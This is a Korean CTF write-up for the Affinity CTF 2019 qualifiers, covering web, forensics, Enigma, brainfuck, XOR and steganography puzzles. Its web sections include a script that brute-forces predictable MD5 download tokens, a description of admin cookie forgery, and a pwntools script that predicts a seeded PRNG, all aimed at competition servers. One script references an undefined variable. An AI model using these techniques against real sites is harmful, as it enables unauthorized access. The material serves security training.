# Affinity CTF 2019 Quals


## Web
[Download me ...](#download-me-...)  
[Hello unknown](#Hello-unknown)  

## Forensics
[Reflection](#Reflection)  
[Man In the Middle](#Man-In-the-Middle)  
[Pharmacist Nightmare](#Pharmacist-Nightmare)  

## Misc
[Sanity Check](#Sanity-Check)  
[DISC ORDer](#DISC-ORDer)  
[MIDI1](#MIDI1)  
[1so2nd3er_maschine](#1so2nd3er_maschine)  
[Reading Disfunction](#Reading-Disfunction)  
[F-word](#F-word)  
[UFO Sounds](#UFO-Sounds)  
[Dancing Queen](#Dancing-Queen)  
[Random Memory](#Random-Memory)  
[MIDI2](#MIDI2)  

## Re
[Backdoor](#Backdoor)  
[Evol Corp 1988](#Evol-Corp-1988)  

## Stego
[Falling into Spiral](#Falling-into-Spiral)  
[Stegoego](#Stegoego)  
[Alphinity](#Alphinity)  
[XY_FUN](#XY_FUN)  
[sQRt(follow the white rabbit)](#sQRt-follow-the-white-rabbit)  
[Intensity Overload](#Intensity-Overload)  

## Crypto
[Alan said.](#Alan-said)  
[9th Symphony](#9th-Symphony)  
[Breaking Bad](#Breaking-Bad)  
[GolanG Heights](#GolanG-Heights)  
[Epic Poem](#Epic-Poem)  
[Grains of Sand](#Grains-of-Sand)  

# Download me ...
http://165.22.22.11:25632
## play
웹 코드를 보면 다른 링크에는 `token`값이 넘어가는데 `flag.txt`만 안넘어간다. token은 `md5` 해시가 적용된 값이었고, 복원해보면 숫자값이었다. 숫자를 `bruteforce attack`을 이용해서 flag.txt의 token값을 구했다.
```python
'''
Code by Hyojin(t0paz)
https://github.com/hyojinlee98

Modify by Jaeseung(g0pher)
'''
import requests
import hashlib

url = 'http://165.22.22.11:25632/download.php?file=flag.txt&token='

def req(token) :
    res = requests.get(url+token)
    if "Invalid token" not in res.text :
        print("[!] token is " + token)
        print("  => " + res.text)
        return True
    return False
        
i = 0
chk = False
while not chk :
    print("[*] Try : " + str(i))
    token = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    i += 1
    chk = req(token)
```
**result**
```
[*] Try : 0
[*] Try : 1
[*] Try : 2

(...)

[*] Try : 34
[!] token is e369853df766fa44e1ed0ff613f563bd
  => AFFCTF{Pr3dic71bl3_t0k3n5_4r3_b4d}
```
## flag
`AFFCTF{Pr3dic71bl3_t0k3n5_4r3_b4d}`


# Hello unknown
http://165.22.22.11:25633/
## play
쿠키정보를 보면 `user`에 `unknown`이라는 데이터가 들어있다. `admin`으로 바꾸면 admin으로 로그인 되어 flag탭이 새로 생긴다. 그러나 그 탭에 들어가보면 flag를 주지 않는다. `burpsuite`를 켜고 조금 둘러보니 로그인을 할 때 `logged`라는 쿠키가 생겼다가 사라진다. 로그인 실패 시 이 쿠키에 `false`라는 값이 담기는데, `true`로 바꾸어주면 flag를 볼 수 있다.
## flag
`AFFCTF{n3v3r_7ru57_u5er5_1npUt}`

# Reflection
## play
`task.gif` 파일이 주어졌다.
``` bash
Reflection git:(master) ✗ binwalk task.gif

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             GIF image data, version "89a", 480 x 480
285539        0x45B63         gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
285695        0x45BFF         GIF image data, version "89a", 540 x 283
491472        0x77FD0         gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
```
`binwalk`로 확인해 보니 `GIF Image`가 숨어있었다. `-e` 옵션으로 추출했다.
``` bash
➜ Reflection git:(master) ✗ binwalk -e task.gif &
[1]  + 10372 exit 3     binwalk -e task.gif
➜ Reflection git:(master) ✗ ls
_task.gif.extracted  task.gif
➜ Reflection git:(master) ✗ cd _task.gif.extracted
➜ _task.gif.extracted git:(master) ✗ ls
45B63  77FD0
➜ _task.gif.extracted git:(master) ✗ file *
45B63: POSIX tar archive (GNU)
77FD0: POSIX tar archive (GNU)
```
추출된 파일을 `file` 명령어로 보니 tar 파일이었다. 압축을 해제해주니 플래그 파일이 나왔다.
```
➜ _task.gif.extracted git:(master) ✗ tar -xvf 45B63
flag.txt
➜ _task.gif.extracted git:(master) ✗ cat flag.txt
AFFCTF{m@k3s_y0u__th0nk}
```
## flag
`AFFCTF{m@k3s_y0u__th0nk}`



# Man In the Middle
Note: put flag into AFFCTF{} format.

## sniff mail
패킷을 보면 ftp로 메일을 보내는 것을 볼 수 있다. `m` 사용자가 비밀번호 `m`을 입력해서 로그인을 성공했고, `the password is Horse Battery Staple Correct`라는 메일을 `k` 사용자에게 전송했다.

## ftp-data?
더 찾아보면 `ftp-data`라는 프로토콜로 전송받은 패킷이 두 개 있다. 하나는 디렉토리를 리스팅한 데이터고, 하나는 `VimCrypt~03!`으로 시작하는 어떤 데이터다. vimcrypt에 대해 알아보니 vim에서 제공하는 암호화 기능이라고 한다. 즉, 저 패킷은 암호화된 파일의 rawdata다. vimcrypt 뒤에 있는 숫자는 암호 종류를 나타낸다. vim에서 제공하는 암호는 zip(01), blowfish(02), blowfish2(03)이 있다. 이 데이터는 blowfish2로 암호화 되었고, crack할 방법은 찾지 못했다.

## solve
m이 보냈던 메일에서 패스워드를 알 수 있었다. 파일을 추출해서 vim으로 열어보면 비밀번호를 입력하라고 뜨고, 위 비밀번호를 입력했더니 플래그가 나왔다.

## flag
`AFFCTF{I_Should_Have_Used_Safer_Connection_...}`  
[참고](https://ctftime.org/writeup/16409)
# Pharmacist Nightmare
Our malware intercepted traffic from one of drugstore computers. Can you find prescription?

hint[... i need your signature Sir..... here under prescription please...]

# Sanity Check
Just a Sanity Check. Flag is: AFFCTF{S4nity_1s_V4nity_!}
## flag
`AFFCTF{S4nity_1s_V4nity_!}`

# DISC ORDer
"... i remember times when proper floppy DISC ORDer matters..."
## fishing
문제에 낚여서 플로피 디스크에 대해서 계속 검색했다. 왜 `ORDer`이렇게 대소문자가 이상하게 되어있는지 의문이 들었는데, `DISCORD`였다. 대회 홈페이지에 처음 접속할 때 있었던 DISCORD 링크로 들어가서 방 제목에서 플래그를 얻었다.
## flag
`AFFCTF{Pr0p3r_C0ms_aR3_4lways_g00d!}`

# MIDI1
plaintext plaintext everywhere....
## solve
주어진 pcap 파일을 열어서 `tcp stream`을 확인해보면 플래그가 보인다.
## flag
`AFFCTF{s3lf_sign3d_is_good_3nough}`

# 1so2nd3er_maschine
Note: put flag into AFFCTF{} format
## analysis
확장자가 없는 파일이 주어졌다. `file` 명령어로 확인해보니 `.wav`파일이었다. 확장자를 바꾸어서 열어보니 딱 봐도 모스부호같은 소리가 났다. 코드를 짜서 모스부호를 얻을 수 있었다.
```python
import wave

w = wave.open("1so2nd3er_machine", "rb")
size = w.getnframes()
flow = list(w.readframes(size))

data = []
for i in range(0, len(flow)):
    if flow[i] == 0x80:
        data.append(0)
    else:
        data.append(1)

raw = "".join([str(i) for i in data])


raw = raw.replace("1"*1400, "-")
raw = raw.replace("1"*400, ".")
raw = raw.replace("0"*1400, " ")
raw = raw.replace("0", "").replace("1","")

raw = raw.replace("  ", " / ")

print(raw)

''' result
-- -... .... ..- / .--. .--- ... / .... .... ..- -..- / .-. --- .- -- -.-. - ..- / -.-. --. .--. ..- .. . -.- --.. -.-. .-.-.- / -.-. -.- .. ..-. ... / .... -.-- .-- / .-. .-.. --- -.. -- - -.-. / .-.. -.-. / .--. .-- ...- ...- -.-- --- / .. .-. -..- . ... ..- ..-. . . / . -..- .--. --- -..- ...- --. -. / -..- --.. ...- -.-. / -... ... - ... / . --- / ... --.. .. -.- -..- -. .. .--- .-.. -- / --.- -... .. ... -... .-- .-.-.- / .- .-.. / -. -..- --- -- / .-. .--- .-. --.. -... / -.- .. / -- -.-- .--- / -.-- .-- --.- --.. ..-. / -.-. -.- ..-. / .--- .- -.- --- - --. .-- / --.. .-- -.- .-- ..-. -..- .-.-.- / .- -. -..- -.- -.-- .. ---... / .-..-. --.- --. . --- --. / ...- .--. .-. - -... ..-. .... / .-.. -- -. .- / -.-. ... / ..-. -.-- .... -- . .-.. .-..-.
'''

''' morse decode
mbhu pjs hhux roamctu cgpuiekzc. ckifs hyw rlodmtc lc pwvvyo irxesufee expoxvgn xzvc bsts eo szikxnijlm qbisbw. al nxom rjrzb ki myj ywqzf ckf jakotgw zwkwfx. anxkyi: "qgeog vprtbfh lmna cs fyhmel"
'''
```
모스부호를 디코딩 했을 때 나오는 암호문은 굉장한 삽질에 원인이었다. 여러 암호를 돌려봤지만 아무것도 알 수 없었다. 힌트는 제목에 있었으며 제목에 `machine`이 아닌 `maschine`이라고 표현되어있었고, 파파고 자동언어 감지가 독일어라고 해준다.

## decrypt
독일의 유명한 애니그마로 암호화 되어있었다. 그러나 애니그마는 해독하기가 까다로운게 암호화 모델도 여러가지, 경우의 수도 무척 많다. 여기서 또 제목에서 힌트를 얻을 수 있는데 `1so2nd3er_maschine` 여기서 숫자를 제외하면 `sonder_maschine`이라는 암호화 모델을 알 수 있다. 그래도 3개의 `rotor`와 `position`, `ring` 값을 모른다. 문제 제목에서 숫자가 있는 이유를 잘 생각해보면 아래와 같은 결과가 나올 수 있다.
```
1so2nd3er
ROTOR1 : I   S O
ROTOR2 : II  N D
ROTOR3 : III E R
```
위와같이 모델을 설정해주고 복호화 하면 아래와 같은 메시지가 나온다.
```
dies ist eine geheime nachricht. unter den wortern in dieser nachricht befindet sich eine zu erhaltende flagge. es kann nicht in die hande des gegners fallen. flagge: "royal capital city of krakow"
```
암호문 같지만 번역기를 돌려보면 독일어임을 알 수 있다.

## flag
`AFFCTF{royal capital city of krakow}`

# Reading Disfunction
nc 165.22.22.11 9999  

## play
``` bash
➜ ctf nc 165.22.22.11 9999
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++++++.------------.-------.+++++++++++++++++++.<<++.>>+++.---------------.-------.+++++++++++++++++++.<<.>>-------------------.+++++++++++++++++.-------------.<<.>>++++++++++++++++++++.----------.++++++.<<.>>---------.+++..----.--.+++++.-------.<<.>>-.+++++++++.+++.<<.>>---------.++++++++++.<<.>>----------.+++++.<<.>>-----------.++.+++++++..<<.>------------------.----.<+.
```
접속하면 위와같이 `brainfuck` 코드가 나온다. 실행해보면 `that what are you looking for is in cell 40!` 라고 출력된다. 대회 당시 `python jail`문제라고 생각해서 무한 삽질했다.

## knowledge
결론은 이 nc 서버는 brinfuck 코드를 입력받는다. 이를 알았다면 brainfuck에 대해 조금 더 알아보아야 한다(https://ko.wikipedia.org/wiki/%EB%B8%8C%EB%A0%88%EC%9D%B8%ED%8D%BD).  
- `>` 포인터 증가  
- `.` 포인터가 가리키는 바이트 값 증가  

## solve
40번째 에 내가 찾는것이 있다고 했으니 다음과 같이 요청하면 flag를 얻을 수 있다.
``` bash
➜ ctf echo `python -c 'print(">"*40 + ">."*80)'` | nc 165.22.22.11 9999
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++++++.------------.-------.+++++++++++++++++++.<<++.>>+++.---------------.-------.+++++++++++++++++++.<<.>>-------------------.+++++++++++++++++.-------------.<<.>>++++++++++++++++++++.----------.++++++.<<.>>---------.+++..----.--.+++++.-------.<<.>>-----[---->+<]>++.+++++..---.>-[--->+<]>-.[----->+<]>++.>--[-->+++++<]>..+++++++++.+++.<<.>>---------.++++++++++.<<.>>----------.+++++.<<.>>-----------.++.+++++++..<<.>------------------.----.<+.
AFFCTF{!s_th!s_th3_r3@l_l!f3__or__!s_th!s_just_f@nt@sy___}
```
## flag
`AFFCTF{!s_th!s_th3_r3@l_l!f3__or__!s_th!s_just_f@nt@sy___}`  
[참고](https://github.com/kernelpoppers/ctf_writeups/tree/master/AffinityCTF2019/reading_disfunction)

# F-word
```
^^^^!^^^^-A?--&-----&&^^^&^!^^^-A?^&!^^^^^-A?--&^^!^^-----A?&-!^^^^^-A?^^&^!^^^^^-A?&^!^^^-A?^^&!^^^-A?---&-!^---A?&^!^------A?&---!^--A?&--!^-----A?&^^!^^^--A?&^^^^^^^^^^^^&^^^&^!^^^-A?^^^&-------------&-!^^^--A?--&^^^!^^^^^-A?^&---!^---A?--&--------&-----&^!^---A?^&^!^^^--A?^&^!^^^^^--A?^&^!--^^^A?^&!^^^^^-A?--&^^^^^^^^^^^^^^&^^^^^&-!^---A?-&&&^^!^^---A?*&
```
## play
`brainfuck`과 비슷하지만 `^, A, !, ?, &`처럼 알 수 없는 문자들이 있다. 분명히 FLAG인 부분이 있을 것이므로 [Brainfuck Encode 사이트](https://copy.sh/brainfuck/text.html)에서 `AFFCTF{`를 인코딩 해보면 다음과 같다.
```
----[---->+<]>++.+++++..---.>-[--->+<]>-.[----->+<]>++.>--[-->+++++<]>.
```
첫 부분부터 개수가 어느정도 매칭이 된다. 이를 매핑해서 replace 해보면 다음과 같다.

``` python
prob = "^^^^!^^^^-A?--&-----&&^^^&^!^^^-A?^&!^^^^^-A?--&^^!^^-----A?&-!^^^^^-A?^^&^!^^^^^-A?&^!^^^-A?^^&!^^^-A?---&-!^---A?&^!^------A?&---!^--A?&--!^-----A?&^^!^^^--A?&^^^^^^^^^^^^&^^^&^!^^^-A?^^^&-------------&-!^^^--A?--&^^^!^^^^^-A?^&---!^---A?--&--------&-----&^!^---A?^&^!^^^--A?^&^!^^^^^--A?^&^!--^^^A?^&!^^^^^-A?--&^^^^^^^^^^^^^^&^^^^^&-!^---A?-&&&^^!^^---A?*&"

prob = prob.replace("A?", "<]>")
prob = prob.replace("-", "+")
prob = prob.replace("&", ".")
prob = prob.replace("^", "-")
prob = prob.replace("!", "[")

# guess,,,
prob = prob.replace("-+", "->+")
prob = prob.replace(".-", ".>-")

print(prob)

''' result
----[---->+<]>++.+++++..>---.>-[--->+<]>-.[----->+<]>++.>--[-->+++++<]>.+[----->+<]>--.>-[----->+<]>.>-[--->+<]>--.[--->+<]>+++.+[->+++<]>.>-[->++++++<]>.+++[->++<]>.++[->+++++<]>.>--[--->++<]>.>------------.>---.>-[--->+<]>---.+++++++++++++.+[--->++<]>++.>---[----->+<]>-.+++[->+++<]>++.++++++++.+++++.>-[->+++<]>-.>-[--->++<]>-.>-[----->++<]>-.>-[++---<]>-.[----->+<]>++.>--------------.>-----.+[->+++<]>+...>--[-->+++<]>*.
'''
```
바로 해독되지 않는다. guess 주석을 달아놓은 두 줄이 확실하지 않기 때문이다. 다행히 brainfuck 특성상 앞부분이 안맞으면 뒷부분도 대체로 안맞을 확률이 높기 때문에 천천히 앞에서부터 `>`기호를 빼거나 그대로 놔두어보면서 완성시킬 수 있다.
```
----[---->+<]>++.+++++..---.>-[--->+<]>-.[----->+<]>++.>--
[-->+++++<]>.+[----->+<]>--.-[----->+<]>.>-[--->+<]>--.[--->+<]
>+++.+[->+++<]>.-[->++++++<]>.+++[->++<]>.++[->+++++<]>.--
[--->++<]>.------------.---.>-[--->+<]>---.+++++++++++++.+
[--->++<]>++.---[----->+<]>-.+++[->+++<]>++.++++++++.+++++.-
[->+++<]>-.-[--->++<]>-.-[----->++<]>-.-[++>---<]>-.[----->+<]
>++.--------------.-----.+[->+++<]>+...>--[-->+++<]>.
```

## flag
`AFFCTF{JuSt_4n0theR_BrainF-w0rd_!!!}`

# UFO Sounds
200
S.E.T.I program captured strange message from outer space.


# Dancing Queen
250
...greetings from Sweden...

Note: gzip -d dancing_queen.tar.gz; docker import dancing_queen.tar dancing:queen ; docker run -i -t dancing:queen /bin/sh

# Random Memory
nc 165.22.22.11 5566

## play
문제의 nc 서버로 접속하면 다음과 같은 내용이 뜬다.
```
[+] Initializing Python Virtual Machine.
[+] System booted (1567949125.7451274), memory check is required, pushing random values to all 31337 cells...
.....................................................
0x0: 0x7952
0x1: 0x4d7
0x2: 0x5101
0x3: 0x51b
0x4: 0x4ca4

(...)

0x205e: 0x41da
0x205f: NULL
[+] Uncorrectable error found in Random Memory Generator. Manual action required.
[+] Set value: 
```
두번째 출력에서 시스템의 timestamp와 cell의 개수를 알려준다. cell은 고정인듯 하고, timestamp만 바뀐다. 위의 정보로 동일한 랜덤 결과를 도출할 수 있다.
``` python
import random

timestamp = float('1567949125.7451274')
cell = 31337
random.seed(timestamp)
for i in range(0x5):
    print(hex(i), hex(random.randint(0,31337)))

''' result
0x0 0x7952
0x1 0x4d7
0x2 0x5101
0x3 0x51b
0x4 0x4ca4
'''
```
위를 통해 시스템의 랜덤 결과값을 예측할 수 있음을 증명했다. 이제 페이로드를 짜면 된다.
``` python
from pwn import *
import random

r = remote('165.22.22.11', 5566)
size = 31337

# get timestamp
r.recvuntil('(')
timestamp = float(r.recvuntil(')'))
print(f'Timestamp : {timestamp}')

# get random list
random.seed(timestamp)
numbers = {
    hex(i) : hex(random.randint(0,size)) for i in range(size+1)
}

# get cell what we have to know
cell = r.recvuntil('NULL').decode('utf-8').split('\n')[-1]
cell = cell.split(':')[0]

key = numbers[data]

r.recvuntil('value:')
r.sendline(key)
print(r.recvline().decode('utf-8'))
```

## flag
`AFFCTF{d0n7_l0s3_y0ur_m3m0ry}`  
[참고](https://ctftime.org/writeup/16387)


# MIDI2
John White is a programmer and musician. John likes to keep his space private and things that are not common.

## play
주어진 패킷을 열어보면 대부분 암호화 되어있고, HTTP 패킷이 간간히 보인다. 그중 `/keyfile`에 대한 응답패킷이 보였다. 패킷을 보면 아래와 같은 내용이 있다.
```
CLIENT_RANDOM 1CA43E0AF85CC083F6E636424124010831FD828A172A0AAAB8C17919D3585BE1 E7EACA03F7CBF6CFEE21F7AC7D62A10873A722F4C7DBA60BBECC0A7E91F1BA44BDFAE83264F40404C7CE43D4C82232DE
```
TLS를 해독할 수 있을 것이라 생각하여 TLS MASTER-Secret log file로 import 했다. 일부분이 복호화 된것을 볼 수 있으며, `HTTP2` 스트림을 살펴보던 중에 파일로 추정되는 패킷을 볼 수 있었다. 추출해서 어떤 파일인지 알아보았다.
``` BASH
➜ file MIDI
MIDI: Standard MIDI data (format 1) using 1 track at 1/220
```
midi 파일임을 알 수 있었고, 확장자를 `.midi`로 바꾸어 `audacity`로 열어보았다. 하단의 음들을 잘 살펴보면 마지막 3개의 음은 매번 반복되는것을 알 수 있다. 반복되지 않는 부분을 중점으로 플래그의 A가 먼저 해독될 것이므로 이를 조합해보면 바이너리 데이터를 표현한 것을 알 수 있다.

## flag
`AFFCTF{3s0t3r1c_l4ngs_4r3_Fun}`


# Backdoor
500
Our security forensics found suspicious file on one of our servers.

Note: Put flag into AFFCTF{} format.

# Evol Corp 1988
700
Sam Sepiol pwned one of the Evol Corp office computers. But stuck in get into one their mainframes. To avoid detection he download only one file and connection dropped.

# Falling into Spiral

# Stegoego

# Alphinity

# XY_FUN
300
Note: put flag into AFFCTF{} format

# sQRt(follow the white rabbit)

# Intensity Overload
700
https://www.youtube.com/watch?v=7xxgRUyzgs0

Note: put flag into AFFCTF{} format.


# Alan said.
100
Note: put flag into AFFCTF{} format and remove whitespaces


# 9th Symphony
150
x3jAgo.{',3p1f{cO{y00{m4cBoyp3am

Note: put flag into AFFCTF{} format

# Breaking Bad
150
HoRfSbMtInMcLvFlAcAmInMcAmTeErFmInHoLvDbRnMd

Note: put flag into AFFCTF{} format.

## play
음,,, 어이가 없지만 화학 원소를 ASCII로 바꾸면 플래그가 나온다. 원소마다 매핑된 ASCII 값이 있다고 한다. [해당 사이트](https://www.lenntech.com/periodic/number/atomic-number.html)를 참고해서 변환하면 된다.

## flag
`AFFCTF{Ch3m1strY_1s_4Dd1CtiVe}`

# GolanG Heights
Note: put flag into AFFCTF{} format

# Epic Poem
Alicja sent text for her friend translator Bob. Because Alicja likes privacy, she encrypted text with key. Bob translate the text and sent back to her also in ecrypted form. Can you find the key?

## play
encrypt된 두 파일이 주어졌다. 둘 중 하나가 flag일 것이라고 생각하고 `AFFCTF{`와 XOR 하면 한개의 파일에서 `Litwo!` 문자열이 나오고, 이를 검색해보니 `Litwo! Ojczyzno moja!(리투아니아! 나의 조국이여!)`라는 시의 첫부분이었다. 시의 뒷부분을 연결해서 복호화 하면 플래그가 나온다.
``` python
from Crypto.Util.strxor import strxor

enc1 = open("enc1").read()
enc2 = open("enc2").read()

guess = "AFFCTF{"

print(strxor(guess, enc1[:len(guess)])) # Litwo!
print(strxor(guess, enc2[:len(guess)]))

key = """Litwo! Ojczyzno moja! Ty jestes jak zdrowie.
Ile cie trzeba cenic, ten tylko sie dowie,
Kto cie stracil. Dzis pieknosc twa w calej ozdobie""".replace("\n", " ")

print(strxor(key, enc1[:len(key)]))
'''
AFFCTF{M4nY_t1m3_PaD_1$_b@d__!!!}
AFFCTF{M4nY_t1m3_PaD_1$_b@d__!!!}
AFFCTF{M4nY_t1m3_PaD_1$_b@d__!!!}
AFFCTF{M4nY_t1m3_PaD_1$_b@d__!!!}
'''
```

## flag
`AFFCTF{M4nY_t1m3_PaD_1$_b@d__!!!}`  
[참고](https://github.com/pcw109550/write-up/tree/master/2019/Affinity/Epic_Poem)


# Grains of Sand
...sand...

